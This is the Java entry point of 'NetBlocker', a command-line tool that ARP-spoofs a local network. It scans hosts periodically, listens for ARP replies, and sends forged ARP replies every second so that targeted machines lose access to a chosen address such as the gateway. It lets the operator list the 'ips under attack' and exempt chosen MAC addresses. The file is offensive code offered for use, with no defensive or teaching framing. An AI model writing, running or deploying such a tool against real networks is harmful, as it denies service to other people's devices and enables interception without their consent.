package NetBlocker;

import NetBlocker.listener.ArpReplyListener;
import NetBlocker.scanners.ArpScanNetwork;
import NetBlocker.sender.ArpReplySender;
import org.apache.commons.cli.*;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.Pcaps;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Main implements Runnable {

    // network address of the network eg. 192.168.0
    private String network = "";

    private Map<InetAddress, MacAddress> machinesToAttack;

    // ip address to block for others eg. gateway address
    private InetAddress machineToBlock;

    private Scanner scanner;

    private Set<MacAddress> machinesToIgnore;

    private Options options;

    private InetAddress machineIpAddress;

    private MacAddress machineMacAddress;

    private String[] arguments;

    public Main(String... args) {
        this.machinesToIgnore = new HashSet<>();
        this.machinesToAttack = new ConcurrentHashMap<>();
        this.scanner = new Scanner(System.in);
        this.arguments = args;
    }


    private void processArguments(String... args) {
        try {
            options = new Options();
            addOptions();
            CommandLineParser parser = new DefaultParser();
            CommandLine cmd = parser.parse(options, args);

            if (cmd.hasOption("h")) {
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("NetBlocker", this.options);
                System.exit(0);
            }

            if (cmd.hasOption("n")) {
                this.network = cmd.getOptionValue("n");
                if (this.network.length() < 1)
                    throw new IllegalArgumentException("please provide with network");
            } else {
                throw new MissingArgumentException("please provide with network");
            }

            if (cmd.hasOption("mac")) {
                String mac = cmd.getOptionValue("mac");
                this.machineMacAddress = MacAddress.getByName(mac,String.valueOf(mac.charAt(2)));
            } else {
                throw new MissingArgumentException("please provide with this machines mac address");
            }

            if (cmd.hasOption("ip")) {
                String ip = cmd.getOptionValue("ip");
                this.machineIpAddress = InetAddress.getByName(ip);
            } else {
                throw new MissingArgumentException("please provide with this machines Ip address");
            }


            if (cmd.hasOption("i")) {
                Arrays.stream(cmd.getOptionValue("i").split(","))
                        .map(String::trim)
                        .map(this::convertToMac)
                        .forEach(this.machinesToIgnore::add);
            }

            if (cmd.hasOption("b")) {
                String ip = cmd.getOptionValue("b");
                this.machineToBlock = InetAddress.getByName(ip);
            } else {
                throw new MissingArgumentException("please provide with this machines Ip address");
            }


        } catch (Exception ex) {
            ex.printStackTrace();
            System.exit(1);
        }

    }

    public void printHelp() {
        HelpFormatter formatter = new HelpFormatter();
        formatter.printHelp("NetBlocker", this.options);
    }

    @Override
    public void run() {
        try {

            processArguments(this.arguments);


            PcapNetworkInterface networkInterface = Pcaps.getDevByAddress(this.machineIpAddress);
            if (networkInterface == null) {
                throw new MissingArgumentException("Please provide valid machine ip address");
            }
            System.out.println("Using the following network interface");
            System.out.println(networkInterface.getDescription());

            PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
            PcapHandle receiveHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);


            ScheduledExecutorService scheduledExecutor = Executors.newScheduledThreadPool(2);


            ArpScanNetwork scanNetwork = new ArpScanNetwork(sendHandle, this.network, this.machineIpAddress, this.machineMacAddress);
            scheduledExecutor.scheduleAtFixedRate(scanNetwork, 2L, 120L, TimeUnit.SECONDS);


            ArpReplyListener arpListener = new ArpReplyListener(receiveHandle, this.machinesToIgnore, this.machinesToAttack, this.machineIpAddress, this.machineToBlock);
            scheduledExecutor.execute(arpListener);


            ArpReplySender arpSender = new ArpReplySender(sendHandle, this.machineMacAddress, this.machineToBlock, this.machinesToAttack);
            scheduledExecutor.scheduleAtFixedRate(arpSender, 2L, 1L, TimeUnit.SECONDS);

            System.out.println("running");
            while (true) {
                System.out.println("press 'p' to print ips under attack or 'q' to quit");
                String input = scanner.nextLine().trim();
                if (input.equals("p")) {
                    System.out.println("ips under attack");
                    machinesToAttack.forEach((key, value) -> System.out.println(key + "  :  " + value));
                    System.out.println("-------------------------------------------");
                    System.out.println("ips not under attack");
                    machinesToIgnore.forEach(System.out::println);
                } else if (input.equals("q")) {
                    scheduledExecutor.shutdownNow();
                    System.out.println("attack down");
                    arpListener.close();
                    System.out.println("listeners down");
                    break;
                } else {
                    System.out.println("wrong input");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }

    }

    private MacAddress convertToMac(String theMacAddress) {
        try {
            return MacAddress.getByName(theMacAddress, String.valueOf(theMacAddress.charAt(2)));
        } catch (Exception ex) {
            ex.printStackTrace();
            System.exit(1);
        }
        return null;
    }

    private void addOptions() {
        // Mandatory arguments
        options.addOption("n", true, "The network id eg: 192.168.1160.5, 160.5 or 110");
        options.addOption("ip", true, "This machines Ip address");
        options.addOption("mac", true, "This machines Mac Address");
        options.addOption("b", true, "Ip address to block for others");

        // Optional arguments
        options.addOption("i", true, "The Mac Address of machines that should not be attacked. \',\' separated. eg: aa:bb:cc:dd:ee:ff");
        options.addOption("h", "HELP");
    }


    public static void main(String[] args) {
        Main main = new Main(args);
        try {
            main.run();
        } catch (Exception ex) {
            main.printHelp();
            System.out.println();
            System.out.println("===================ERROR===================");
            ex.printStackTrace();
        }
    }


}
